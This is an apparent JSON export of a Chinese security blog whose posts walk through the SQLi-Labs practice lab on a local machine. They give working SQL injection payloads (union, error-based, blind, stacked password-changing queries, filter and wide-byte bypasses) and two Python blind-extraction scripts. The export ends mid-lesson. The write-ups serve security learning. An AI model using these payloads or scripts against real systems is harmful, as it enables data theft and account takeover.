{"meta":{"title":"R4x's Blog","subtitle":"R4x's Blog","description":"道阻且长，行则将至","author":"R4x","url":"http://r4x.top","root":"/"},"pages":[{"title":"[404]","date":"2022-11-10T08:35:36.975Z","updated":"2022-11-10T08:35:36.975Z","comments":true,"path":"404.html","permalink":"http://r4x.top/404.html","excerpt":"","text":""},{"title":"Index.me","date":"2022-11-10T08:09:46.000Z","updated":"2022-11-10T08:44:15.822Z","comments":true,"path":"about/index.html","permalink":"http://r4x.top/about/index.html","excerpt":"","text":"Test"}],"posts":[{"title":"SQLi-Labs靶场刷题记录【Challenges】","slug":"SQLi-Labs  Challenges","date":"2022-11-17T16:00:00.000Z","updated":"2022-11-21T01:39:41.725Z","comments":true,"path":"2022/11/18/SQLi-Labs  Challenges/","link":"","permalink":"http://r4x.top/2022/11/18/SQLi-Labs%20%20Challenges/","excerpt":"","text":"# Lesson 54 ![](https://gitee.com/n0usss/my-pictures/raw/master/pics/202211180956666.png) 这一关开始进入challenge部分，Lesson 54只有10次查询机会，我们的目标是拿到秘钥（secret key），除了数据库名，表名，列名，数据都是随机先正常查询一下看看： 1http://127.0.0.1/Less-54/index.php?id=1 发现提示了目前的尝试次数，ok，先测试一下注入方式： 1http://127.0.0.1/Less-54/index.php?id=1&#x27;--+ 正常回显，union注入暴表名： 1http://127.0.0.1/Less-54/index.php?id=0&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;challenges&#x27; --+ 列名： 1http://127.0.0.1/Less-54/index.php?id=0&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;662ROTYAS7&#x27; --+ 查看secret_SNMK: 1http://127.0.0.1/Less-54/index.php?id=0&#x27; union select 1,2,secret_SNMK from challenges.662ROTYAS7 --+ 提交，成功： Lesson 55测试闭合方式： 123456http://127.0.0.1/Less-55/index.php?id=0 union select 1,2,database()--+http://127.0.0.1/Less-55/index.php?id=0&#x27; union select 1,2,database()--+http://127.0.0.1/Less-55/index.php?id=0&#x27;) union select 1,2,database()--+http://127.0.0.1/Less-55/index.php?id=0&quot;) union select 1,2,database()--+//workhttp://127.0.0.1/Less-55/index.php?id=0) union select 1,2,database()--+ 可以判断是数字型，小括号闭合，剩下的部分同上一题 Lesson 56测试后发现是字符型，单引号加小括号闭合的union注入： 1http://127.0.0.1/Less-56/index.php?id=0&#x27;) union select 1,2,database()--+ 其余同Lesson 54 Lesson 57字符型，双引号闭合，union注入： 1http://127.0.0.1/Less-57/index.php?id=0&quot; union select 1,2,database()--+ Lesson 58这一关只有五次尝试机会，先判断类型： 1http://127.0.0.1/Less-58/index.php?id=0&#x27; 报错然而使用之前的payload并不会显示数据： 1http://127.0.0.1/Less-58/index.php?id=0&quot; union select 1,2,database()--+ 尝试报错注入： 1http://127.0.0.1/Less-58/index.php?id=1&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) --+ reset一下继续（实际测试中可以直接换ip）： 1http://127.0.0.1/Less-58/index.php?id=1&#x27; and updatexml(1,concat(0x7e,(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;challenges&#x27;),1)),0x7e),1) --+ 列名： 1http://127.0.0.1/Less-58/index.php?id=1&#x27; and updatexml(1,concat(0x7e,(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;XL4C6FX95Q&#x27;),1)),0x7e),1) --+ 数据： 1http://127.0.0.1/Less-58/index.php?id=1&#x27; and updatexml(1,concat(0x7e,(substr((select secret_RRG9 from challenges.XL4C6FX95Q),1)),0x7e),1) --+ 提交： Lesson 59数字型闭合方式，其他与Lesson 58相同，只要改一下payload中的闭合方式就可以： 1http://127.0.0.1/Less-59/index.php?id=1 and updatexml(1,concat(0x7e,database(),0x7e),1) --+ Lesson 60双引号加括号闭合： 1http://127.0.0.1/Less-60/index.php?id=0&quot;) and updatexml(1,concat(0x7e,database(),0x7e),1) --+ Lesson 61单引号加两层括号闭合： 1http://127.0.0.1/Less-61/index.php?id=0&#x27;)) and updatexml(1,concat(0x7e,database(),0x7e),1) --+ Lesson 62这关开始直接有130次尝试次数：这么多次数，猜测就是盲注： 1http://127.0.0.1/Less-62/index.php?id=1&#x27;) --+ 单引号加括号闭合，接下来就是编写盲注脚本了：参考：https://www.jianshu.com/p/f1811e108d58 12345678910111213141516171819202122232425262728293031323334353637383940414243444546import requestsimport stringun_chars = string.digits + string.ascii_uppercase uln_chars = string.digits + string.ascii_uppercase + string.ascii_lowercaseurl = &quot;http://127.0.0.1/Less-62/index.php&quot; try_count = 0def extract_data(tmpl_payload, length, chars): global try_count result = &quot;&quot; for i in range(1, length + 1): left, right = 0, len(chars) - 1 while left &lt; right: m = (left + right) // 2 payload = tmpl_payload % (i, ord(chars[m])) resp = requests.get(url, params=&#123;&quot;id&quot;: payload&#125;) try_count += 1 if &quot;Your Login name&quot; in resp.text: left = m + 1 else: right = m result += chars[left] return resulttable_name = extract_data( &quot;1&#x27;) and ascii(substr((select table_name from information_schema.TABLES where TABLE_SCHEMA=&#x27;challenges&#x27;),%s,1))&gt;%d#&quot;, 10, un_chars)print(&quot;table_name:&quot;, table_name)column_name = &quot;secret_&quot; + extract_data( &quot;1&#x27;) and ascii(substr(substr((select column_name from information_schema.columns where TABLE_name=&#x27;&quot; + table_name + &quot;&#x27; limit 2,1),8,4),%s,1))&gt;%d#&quot;, 4, un_chars)print(&quot;column_name:&quot;, column_name)secret_key = extract_data( &quot;1&#x27;) and ascii(substr((select &quot; + column_name + &quot; from &quot; + table_name+&quot;),%s,1))&gt;%d#&quot;, 24, uln_chars)print(&quot;secret_key:&quot;, secret_key)print(&quot;Done. try_count:&quot;, try_count) Lesson 631http://127.0.0.1/Less-63/index.php?id=1&#x27; and substr(database(),1,1)=&#x27;c&#x27; --+ Lesson62单引号闭合版本 Lesson 641http://127.0.0.1/Less-64/index.php?id=1)) and substr(database(),1,1)=&#x27;c&#x27; --+ Lesson 62 双小括号闭合版本 Lesson 651http://127.0.0.1/Less-65/index.php?id=1&quot;) and substr(database(),1,1)=&#x27;c&#x27; --+ Lesson 62 双引号加括号闭合版本","categories":[],"tags":[]},{"title":"SQLi-Labs靶场刷题记录【Stacked Challenges】","slug":"SQLi-Labs Stacked Injection","date":"2022-11-16T16:00:00.000Z","updated":"2022-11-21T01:39:36.869Z","comments":true,"path":"2022/11/17/SQLi-Labs Stacked Injection/","link":"","permalink":"http://r4x.top/2022/11/17/SQLi-Labs%20Stacked%20Injection/","excerpt":"","text":"# Lesson 38 **stacked Query** ![](https://gitee.com/n0usss/my-pictures/raw/master/pics/202211171038993.png) 从这一节开始就是堆叠注入了，堆叠注入的基本原理是使用`;`分隔注入的sql语句，从而能在一次注入中执行多个SQL语句，其与union不同的是，union只能联合执行查询语句，而堆叠注入可以注入任何SQL语句 回到题目，我们尝试堆叠注入语句修改用户的密码： 1http://127.0.0.1/Less-38/?id=1&#x27;;update users set password=&#x27;hacked&#x27; where username=&#x27;Dumb&#x27;;--+ ![](https://gitee.com/n0usss/my-pictures/raw/master/pics/202211171046295.png) 需要注意的是，这里的表名和列名都需要依赖其他方式获得，因为大多数web系统中，只会在前端显示一条SQL查询的结果，所以很难通过堆叠注入查询信息 # Lesson 39 **整数型的堆叠查询** ![](https://gitee.com/n0usss/my-pictures/raw/master/pics/202211171050960.png) 这一关是整数型的查询，去掉Lesson 38的单引号即可： 1http://127.0.0.1/Less-39/?id=1;update users set password=&#x27;hacked11&#x27; where username=&#x27;Dumb&#x27;;--+ ![](https://gitee.com/n0usss/my-pictures/raw/master/pics/202211171052924.png) # Lessson 40 **字符型堆叠盲注** ![](https://gitee.com/n0usss/my-pictures/raw/master/pics/202211171111182.png) 这关不会输出报错信息，但还是会输出用户信息，所以只要语句注入成功，再正常查询id即可看到结果 测试后发现闭合方式为`')`: 1http://127.0.0.1/Less-40/?id=1&#x27;)--+ ![](https://gitee.com/n0usss/my-pictures/raw/master/pics/202211171115247.png) 注入： 1http://127.0.0.1/Less-40/?id=1&#x27;);update users set password=&#x27;hacked22&#x27; where username=&#x27;Dumb&#x27;;--+ ![](https://gitee.com/n0usss/my-pictures/raw/master/pics/202211171116495.png) # Lesson 41 **数字型堆叠盲注** ![](https://gitee.com/n0usss/my-pictures/raw/master/pics/202211171117059.png) 1http://127.0.0.1/Less-41/?id=1;update users set password=&#x27;hacked33&#x27; where username=&#x27;Dumb&#x27;;--+ ![](https://gitee.com/n0usss/my-pictures/raw/master/pics/202211171118459.png) # Lesson 42 **POST方法字符型堆叠注入** ![](https://gitee.com/n0usss/my-pictures/raw/master/pics/202211171120908.png) burp抓包注入： ![](https://gitee.com/n0usss/my-pictures/raw/master/pics/202211171125752.png) 通过其他关查看注入结果： ![](https://gitee.com/n0usss/my-pictures/raw/master/pics/202211171126400.png) # Lesson 43 **POST方法基于错误带括号的字符型注入** ![](https://gitee.com/n0usss/my-pictures/raw/master/pics/202211171128054.png) 比Lesson 42闭合方式多个括号 ![](https://gitee.com/n0usss/my-pictures/raw/master/pics/202211171131791.png) 查看结果： ![](https://gitee.com/n0usss/my-pictures/raw/master/pics/202211171131491.png) # Lesson 44 **POST方法基于错误的堆叠盲注** ![](https://gitee.com/n0usss/my-pictures/raw/master/pics/202211171133072.png) 除了没有报错，和之前一样： ![](https://gitee.com/n0usss/my-pictures/raw/master/pics/202211171135724.png) 其他关查询： ![](https://gitee.com/n0usss/my-pictures/raw/master/pics/202211171135425.png) # Lesson 45 **POST方法基于错误带括号的堆叠盲注** ![](https://gitee.com/n0usss/my-pictures/raw/master/pics/202211171136845.png) 就比Lesson44多个括号： ![](https://gitee.com/n0usss/my-pictures/raw/master/pics/202211171138656.png) ![](https://gitee.com/n0usss/my-pictures/raw/master/pics/202211171138128.png) # Lesson 46 **GET方法基于错误的数字型排序注入** ![](https://gitee.com/n0usss/my-pictures/raw/master/pics/202211171219321.png) 这一关开始进入排序注入，提示使用sort参数输入，测试一下： 1http://127.0.0.1/Less-46/?sort=1 ![](https://gitee.com/n0usss/my-pictures/raw/master/pics/202211171552363.png) 1http://127.0.0.1/Less-46/?sort=2 可以看出这里是用sort参数控制第几列进行排序，这里可以基于报错注入，也可以基于盲注： 报错注入看到很多博客都是用的《注入天书》的payload，但其实用基于xmlupdate()的报错注入也可以，而且更加简单一些： 1http://127.0.0.1/Less-46/?sort=1 and updatexml(1,concat(0x7e,database(),0x7e),1) 剩下的部分和之前是一样的注入天书payload： 123456789101112//库名http://127.0.0.1/Less-46/?sort=(select 1 from (select count(*),concat_ws(&#x27;-&#x27;,(select database()),floor(rand()*2))as a from information_schema.tables group by a) b)//表名http://127.0.0.1/Less-46/?sort=(select 1 from (select count(*),concat_ws(&#x27;-&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),floor(rand()*2))as a from information_schema.tables group by a) b)//字段名http://127.0.0.1/Less-46/?sort=(select 1 from (select count(*),concat_ws(&#x27;-&#x27;,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),floor(rand()*2))as a from information_schema.tables group by a) b)//数据http://127.0.0.1/Less-46/?sort=(select 1 from (select count(*),concat_ws(&#x27;-&#x27;,(select concat_ws(&#x27;-&#x27;,id,username,password) from users limit 0,1),floor(rand()*2))as a from information_schema.tables group by a) b) 布尔盲注 参考：https://www.jianshu.com/p/e3437b562e20 MySQL也是弱类型，它会认为true=1，false=0，用在order by后面会有不同的显示： 1http://127.0.0.1/Less-46/?sort=true 1http://127.0.0.1/Less-46/?sort=false payload： 1http://127.0.0.1/Less-46/?sort=rand((ascii(mid((select schema_name from information_schema.schemata limit 0,1),1,1)))&gt;115) Lesson 47GET方法基于错误的字符型排序注入基于Lesson 46加个单引号闭合就好： 1http://127.0.0.1/Less-47/?sort=1&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1)--+ Lesson 48GET方法基于错误的数字型排序盲注（作者懒狗，图片显示的还是Lesson 47）这一关不再显示报错信息，考虑时间盲注 1http://127.0.0.1/Less-48/?sort=1 and if(substr(database(),1,1)=&#x27;s&#x27;,sleep(1),1) --+ 1http://127.0.0.1/Less-48/?sort=1 and if(substr(database(),1,1)=&#x27;a&#x27;,sleep(1),1) --+ Lesson 49GET方法基于错误的字符型排序盲注基于Lesson 48，使用单引号闭合一下就好 1http://127.0.0.1/Less-49/?sort=1&#x27; and if(substr(database(),1,1)=&#x27;s&#x27;,sleep(1),1) --+ Lesson 50GET方法基于错误的数字型堆叠排序注入将前面学到的结合利用一下就好： 1http://127.0.0.1/Less-50/?sort=1;update users set password=&#x27;hahaha&#x27; where username=&#x27;Dumb&#x27;;--+ Lesson 51GET方法基于错误的字符型堆叠排序注入单引号闭合后即可： 1http://127.0.0.1/Less-51/?sort=1&#x27;;update users set password=&#x27;hahaha111&#x27; where username=&#x27;Dumb&#x27;;--+ Lesson 52GET方法基于错误的数字型堆叠排序盲注直接利用： 1http://127.0.0.1/Less-52/?sort=1;update users set password=&#x27;hahaha222&#x27; where username=&#x27;Dumb&#x27;;--+ Lesson 53GET方法基于错误的字符型堆叠排序盲注加个单引号闭合： 1http://127.0.0.1/Less-53/?sort=1&#x27;;update users set password=&#x27;hahaha333&#x27; where username=&#x27;Dumb&#x27;;--+","categories":[],"tags":[]},{"title":"SQLi-Labs靶场刷题记录【Adv Challenges】","slug":"SQLi-Labs Adv Challenges","date":"2022-11-15T16:00:00.000Z","updated":"2022-11-21T01:39:40.095Z","comments":true,"path":"2022/11/16/SQLi-Labs Adv Challenges/","link":"","permalink":"http://r4x.top/2022/11/16/SQLi-Labs%20Adv%20Challenges/","excerpt":"","text":"![](https://gitee.com/n0usss/my-pictures/raw/master/pics/202210242135027.png) # Lesson 21 **Cookie Injection- base64 encoded-single quotes and parenthesis（Cookie 注入 - base64 编码的单引号和括号）** 今天开始sqli-lab的二阶段，高级注入篇，根据标题，推测思路应该是在Http的cookie字段进行注入，并对payload进行base64编码，不过抓包重放前，还是先随便输入看一下前端的回显： ![](https://gitee.com/n0usss/my-pictures/raw/master/pics/202210242144482.png) 输入`admin:admin(username:password)`： ![](https://gitee.com/n0usss/my-pictures/raw/master/pics/202210242145523.png) 和前面的题差不多，显示出了Http包中的一些信息，burp抓包： ![](https://gitee.com/n0usss/my-pictures/raw/master/pics/202210242148450.png) 可以在这里看到base64编码后的cookie头，解码后的结果如下： ![](https://gitee.com/n0usss/my-pictures/raw/master/pics/202210242149215.png) 这样思路就有了：构造payload->base64编码->重放，根据之前的题目，尝试构造一下updatexml的报错注入： 1admin&#x27;) and updatexml(1,concat(0x7e,database(),0x7e),1) -- (注意最后还有个空格) 编码后： 1YWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsZGF0YWJhc2UoKSwweDdlKSwxKSAtLSA= 重放： ![](https://gitee.com/n0usss/my-pictures/raw/master/pics/202210262345375.png) 可以看到爆出了信息，其余的和之前的类似 # Lesson 22 **Cookie Injection- Error Based- Double Quotes - string (基于错误的双引号字符型Cookie注入)** 根据标题，先尝试将Lesson21的单引号改为双引号： 1admin&quot; and updatexml(1,concat(0x7e,database(),0x7e),1) -- Base64编码： 1YWRtaW4iIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSxkYXRhYmFzZSgpLDB4N2UpLDEpIC0tIA== 成功： ![](https://gitee.com/n0usss/my-pictures/raw/master/pics/202210271737367.png) ![](https://gitee.com/n0usss/my-pictures/raw/master/pics/202210271737567.png) 其余与之前类似 # Lesson 23 **GET - Error based - strip comments (基于错误的，过滤注释的GET型)** 根据标题可以知道肯定是过滤了注释符号，试一下单引号： 1?id=1&#x27; ![](https://gitee.com/n0usss/my-pictures/raw/master/pics/202210282149203.png) 发现报错，尝试闭合语句： 1?id=1&#x27; and &#x27;1&#x27; =&#x27;1 ![](https://gitee.com/n0usss/my-pictures/raw/master/pics/202210282151949.png) 并没有报错，猜一下列名： 1?id=-1&#x27; union select 1,2,3 and &#x27;1&#x27; =&#x27;1 爆数据库名： 1?id=-1&#x27; union select 1,database(),3 and &#x27;1&#x27; =&#x27;1 ![](https://gitee.com/n0usss/my-pictures/raw/master/pics/202210282153831.png) 表名： 1?id=-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&quot;security&quot;),3 and &#x27;1&#x27; =&#x27;1 ![](https://gitee.com/n0usss/my-pictures/raw/master/pics/202210282157703.png) 剩下的就和前面一样了，当然这里也可以使用`updatexml()`报错注入 Lesson 24Second Degree Injections Real treat -Store Injections (二次注入)根据题目，发现考察的是二次注入，有关二次注入的知识，参考这篇文章： http://www.beesfun.com/2017/03/28/MySQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5-%E4%B8%89/ 先看一下修改密码处：发现不能修改，那就注册一个普通账号登上去看看：发现这里可以修改密码，那么思路就有了：注册一个包含危险字符的账号test&#39; #，再登录上这个账号修改密码，此时在源码中的SQL语句就会变成这样： 1$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;test&#x27;#&#x27; and password=&#x27;$curr_pass&#x27; &quot;; 此时相当于直接修改了test用户的密码，而不需要该用户原本的账号，形成了任意用户密码修改的攻击先注册名为test&#39; # 账号：登录：直接输入新密码修改，无需输入当前密码，即可修改test用户的密码： Lesson 25Trick with OR &amp; AND（过滤了OR和AND）打开界面，发现是这样的，简单测试后发现，输入后地下的hint会显示出输入插入进SQL语句的样子： 1http://127.0.0.1/Less-25/?id=1&#x27; oorrder by 1 anandd &#x27;1&#x27;=&#x27;1 回到题目，根据标题可以得知这关过滤了OR和AND，测试后发现只是简单的一层过滤，并没有递归过滤，那么可以按以下的方式绕过： 123oorrder -&gt; orderoorr -&gt; oraandnd -&gt; and 除了这一点，其余与之前的题目没有区别： 1?id=-1&#x27; union select 1,database(),2 --+ Lesson 25aTrick with OR &amp; AND Blind （过滤了or和and的盲注）这一关变成了过滤OR和AND的盲注，也没有用单引号包裹： 1?id=-1 union select 1,database(),2 同时，这关并不会显示错误信息，其余的和之前一样，也可以使用盲注的方法爆数据 Lesson 26Error based - All your SPACES and COMMENTS belong to us 过滤了所有空格和注释符号的报错注入先探测一下闭合方式： 1http://127.0.0.1/Less-26/?id=1&#x27; 单引号闭合，根据题目，应该是过滤了空格和注释符号，常见的绕过思路是使用URL编码绕过空格过滤： 123456%09 TAB 键（水平）%0a 新建一行%0b TAB 键（垂直）%0c 新的一页%0d return 功能%a0 空格 参考：HTML URL 编码参考手册尝试如下payload： 1http://127.0.0.1/Less-26/?id=1&#x27;%a0and&#x27;1&#x27;=&#x27;1 发现还过滤了and:用之前的思路绕过： 1http://127.0.0.1/Less-26/?id=1&#x27;%a0aandnd&#x27;1&#x27;=&#x27;1 构造如下payload： 1http://127.0.0.1/Less-26/?id=0&#x27;%a0union%a0select%a01,database(),2%a0anandd&#x27;1&#x27;=&#x27;1 需要注意的是：之前使用id=-1来使前面的查询语句为false，但如果这关使用id=-1会发现爆不出库名，原因是过滤了注释符号--这里有一种使用and的构造方法：使用||符号，||用来在SQL语句中连接多个字段，用法如下： 1select 1,字段1||字段2...||字段n 那就可以构造这样的payload，以防and被递归过滤的情况： 1http://127.0.0.1/Less-26/?id=0&#x27;%a0union%a0select%a01,database(),2%a0||&#x27;1&#x27;=&#x27;1 后续的步骤与之前类似 报错注入这道题还可以使用基于updatexml()的报错注入： 库名：1http://127.0.0.1/Less-26/?id=0&#x27;||updatexml(1,concat(&#x27;^&#x27;,(database())),0)||&#x27;1&#x27;=&#x27;1 表名：1http://127.0.0.1/Less-26/?id=0&#x27;||updatexml(1,concat(&#x27;^&#x27;,(select%a0group_concat(table_name)%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema=&#x27;security&#x27;)),0)||&#x27;1&#x27;=&#x27;1 需要注意的是：这里还过滤了or，所以information_schema要写为infoorrmation_schema不使用空格的写法： 1http://127.0.0.1/Less-26/?id=0&#x27;||updatexml(1,concat(&#x27;^&#x27;,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#x27;security&#x27;))),0)||&#x27;1&#x27;=&#x27;1 剩下的与之前类似，不再赘述 Lesson 26aGET - Blind Based - All your SPACES and COMMENTS belong to us(过滤了空格和注释的盲注)过滤方式和Less-26一样，只是不再输出报错，盲注一下： 1http://127.0.0.1/Less-26a/?id=1&#x27;%a0anandd%a0substr(database(),1,1)=&#x27;s 1http://127.0.0.1/Less-26a/?id=1&#x27;%a0anandd%a0substr(database(),1,1)=&#x27;a 编写脚本爆库名： 12345678910111213141516171819202122232425262728293031import requestsURL = &quot;http://127.0.0.1/Less-26a/&quot;flag = &quot;Your Login name&quot;# 获取数据库名长度def db_len(): for i in range(1,10): payload = &quot;?id=1&#x27;%a0anandd%a0length(database())=\\ &#123;0&#125;%a0anandd%a0&#x27;1&#x27;=&#x27;1&quot;.format(i) r = requests.get(URL + payload) if(flag in r.text): return int(i)# 获取数据库名def db_name(length): name = &quot;&quot; for i in range(1,length+1): for j in range(0,26): char = chr(97+j) payload = &quot;?id=1&#x27;%a0anandd%a0substr(database(),\\ &#123;0&#125;,1)=&#x27;&#123;1&#125;&quot;.format(i,char) r = requests.get(URL + payload) if(flag in r.text): name += char continue return nameif __name__ == &quot;__main__&quot;: print(db_name(db_len())) 输出如下：剩下的简单修改脚本即可 Lesson 27GET - Error Based- All your UNION &amp; SELECT belong to us （过滤了union和select的基于错误的注入）根据题目，过滤了Union和select，利用大小写绕过爆库名： 1http://127.0.0.1/Less-27/?id=0&#x27;%a0UnioN%a0SeLect%a01,database(),2%a0and%a0&#x27;1&#x27;=&#x27;1 其余与前面相同，除了基于正确注入，还可以基于报错注入和Bool盲注 过滤代码123456789101112131415161718$id = blacklist($id);$hint = $id;function blacklist($id)&#123; $id= preg_replace(&#x27;/[\\/\\*]/&#x27;,&quot;&quot;,$id); //strip out /* $id= preg_replace(&#x27;/[--]/&#x27;,&quot;&quot;,$id); //Strip out --. $id= preg_replace(&#x27;/[#]/&#x27;,&quot;&quot;,$id); //Strip out #. $id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;,$id); //Strip out spaces. $id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;,$id); //Strip out spaces. $id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;,$id); //Strip out spaces. $id= preg_replace(&#x27;/union/s&#x27;,&quot;&quot;,$id); //Strip out union $id= preg_replace(&#x27;/select/s&#x27;,&quot;&quot;,$id); //Strip out select $id= preg_replace(&#x27;/UNION/s&#x27;,&quot;&quot;,$id); //Strip out UNION $id= preg_replace(&#x27;/SELECT/s&#x27;,&quot;&quot;,$id); //Strip out SELECT $id= preg_replace(&#x27;/Union/s&#x27;,&quot;&quot;,$id); //Strip out Union $id= preg_replace(&#x27;/Select/s&#x27;,&quot;&quot;,$id); //Strip out select return $id;&#125; Lesson 27aGET - Blind Based- All your UNION &amp; SELECT belong to us - Double Quotes （过滤了union和select的盲注）这一关与前面的区别只是将单引号改为了双引号闭合，并且只能盲注，基于26a将过滤的字符大小写绕过一下即可 Lesson 28GET - Error Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesis基于错误的，有括号的单引号字符型，过滤了union和select等的注入根据题目，闭合方式为单引号有括号，尝试下面的payload： 1http://127.0.0.1/Less-28/?id=1&#x27;);%00 这里使用%00将后面的语句截断爆库名： 1http://127.0.0.1/Less-28/?id=0&#x27;)%a0Union%a0select%a01,database(),3;%00 其余的与之前类似，也可以使用盲注 过滤代码123456789101112$id = blacklist($id);$hint = $id;function blacklist($id)&#123; $id= preg_replace(&#x27;/[\\/\\*]/&#x27;,&quot;&quot;,$id); //strip out /* $id= preg_replace(&#x27;/[--]/&#x27;,&quot;&quot;,$id); //Strip out --. $id= preg_replace(&#x27;/[#]/&#x27;,&quot;&quot;,$id); //Strip out #. $id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;,$id); //Strip out spaces. $id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;,$id); //Strip out spaces. $id= preg_replace(&#x27;/union\\s+select/i&#x27;,&quot;&quot;,$id); //Strip out UNION &amp; SELECT. return $id;&#125; Lesson 28a这道题与Less28没有太大区别，只是变成了盲注，过滤条件比上题还松一点 过滤代码1234567891011function blacklist($id)&#123;//$id= preg_replace(&#x27;/[\\/\\*]/&#x27;,&quot;&quot;, $id); //strip out /*//$id= preg_replace(&#x27;/[--]/&#x27;,&quot;&quot;, $id); //Strip out --.//$id= preg_replace(&#x27;/[#]/&#x27;,&quot;&quot;, $id); //Strip out #.//$id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id); //Strip out spaces.//$id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id); //Strip out spaces.//$id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id); //Strip out spaces.$id= preg_replace(&#x27;/union\\s+select/i&#x27;,&quot;&quot;, $id); //Strip out spaces.return $id;&#125; 除了最后一行其他全都过滤掉了 Lesson 29Lesson29-31这几关主要涉及的是两层服务器的情况，题目并不困难，问题是Tomcat环境的配置，我是用docker跑的sqli-labs，主要参考这篇文章进行配置，博主讲的很详细，我不再赘述需要注意的是，如果和我一样使用docker搭建环境，那需要重新开一个容器，并添加容器内8080端口和80端口的映射，环境配置好之后还需要修改index.jsp文件，因为我是基于acgpiano/sqli-labs这个镜像配置的，所以和默认的index.jsp中链接路径有所不同回到题目：使用一个参数注入： 1http://localhost:12345/sqli-labs/Less-29/index.jsp?id=1&#x27; 就会触发WAF，这是因为Tomcat服务器解析了这个参数并返回，关于服务器的两层架构，参考这篇文章这里的中间服务器是Tomcat，所以Tomcat会解析第一个参数，然后Tomcat去请求apache，apache会解析最后一个参数，而最后返回的参数也是apache处理的参数，如： 1http://localhost:12345/sqli-labs/Less-29/index.jsp?id=1&amp;id=2 这样我们就可以使用第二个参数进行注入： 1http://localhost:12345/sqli-labs/Less-29/index.jsp?id=1&amp;id=2&#x27; 报错，剩下的就很简单了，因为本题主要考察的是参数污染，所以注入部分参考之前的就可以 Lesson 30~31Lesson 29的盲注版本和带括号版本，除此之外和Lesson 29一模一样，不再赘述 Lesson 32GET - Bypass custom filter adding slashes to dangerous chars 对危险字符添加反斜线过滤本题考察宽字节注入，相关知识参考：https://zgao.top/mysql%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/加个单引号先测试一波： 1http://127.0.0.1/Less-32/?id=1&#x27; 发现后端将单引号加了反斜线，直接使用%df绕过： 1http://127.0.0.1/Less-32/?id=0%df&#x27;union select 1,database(),2--+ 成功绕过，这里使用注入%df后，由于反斜杠编码后是%5c，所以参数传入代码层后会变为%df%5c%27，而mysql在解析%df%5c 时会将其看作一个宽字节，它认为两个字节就是GBK编码表示的汉字，这里是“運”，从而使反斜线失去了效果，这里只要第一个字节大于128即可后续注入与前面一样，不再赘述 Lesson 33基于错误_GET_单引号_字符型_addslashes()_宽字节注入这一关使用了addslashes()函数进行过滤，其在特定的字符前加入反斜杠进行转义： 1234单引号 &#x27;双引号 &quot;反斜杠 \\空字符 NULL 其余与Lesson32完全相同 Lesson 34基于POST方法的反斜线Bypass本题考察问题和Less-33一致，同样可以使用宽字节注入，只是参数提交方法变为了POST，burp抓包重放即可，这里使用报错注入： Lesson 35基于错误的GET型，数字型宽字节注入既然是数字型，那不需要单引号来闭合，直接就可以利用： 1http://127.0.0.1/Less-35/?id=-1 union select 1,database(),3 --+ Lesson 36基于错误的GET型，单引号字符型，mysql-real-escape-string()宽字节注入 mysql-real-escape-string()函数这关使用mysql-real-escape-string()函数进行过滤，其作用是转义SQL语句中使用的字符串中的特殊字符： 1234567\\x00\\n\\r\\&#x27;&quot;\\x1a 语法1mysql_real_escape_string(_string_,_connection_) 参数 描述 string 必需。规定要转义的字符串。 connection 可选。规定 MySQL 连接。如果未规定，则使用上一个连接。 这个函数也可以直接使用宽字节注入： 1http://127.0.0.1/Less-36/?id=0%df&#x27;union select 1,database(),2 --+ Lesson 37Lesson 36的POST版本","categories":[],"tags":[]},{"title":"SQLi-Labs靶场刷题记录【Basic Challenges】","slug":"SQLi-Labs Basic Challenges","date":"2022-10-22T16:00:00.000Z","updated":"2022-11-21T01:39:40.958Z","comments":true,"path":"2022/10/23/SQLi-Labs Basic Challenges/","link":"","permalink":"http://r4x.top/2022/10/23/SQLi-Labs%20Basic%20Challenges/","excerpt":"","text":"Lesson 1GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入提示用参数名为id，值为数字，尝试一下： 1http://127.0.0.1/Less-1/?id=1 显示了用户名和密码，测试后发现共有14条数据。 【1】查列数1http://127.0.0.1/Less-1/?id=1&#x27; order by 3 --+ 1http://127.0.0.1/Less-1/?id=1&#x27; order by 4 --+ 到第四列时报错，共有三列数据 【2】查库名1http://127.0.0.1/Less-1/?id=?id=-1&#x27; union select 3,database(),database(); --+ 要注意的两个点： id必须为-1，或任何表中不存在的id，因为如果存在的话，name和password处就会显示该表中该id对应的数据，后面联合查询到的数据不会被显示出来 联合查询会将查出来的数据与原来查询出的数据并列，所以联合查询的条数要等于原表中的列数，否则会报错，这里查询出来大约是如下的样子：123456+----+--------------+---------------------------+| id | name | url | +----+--------------+---------------------------+| -1 | | || 3 | security | security |+----+--------------+---------------------------+ 【3】获取所有表1http://127.0.0.1/Less-1/?id=?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+ GROUP_CONCAT()：将group by产生的同一个分组中的值连接起来，返回一个字符串结果 information_schema.tables各字段说明： 字段 含义 Table_catalog 数据表登记目录 Table_schema 数据表所属的数据库名 Table_name 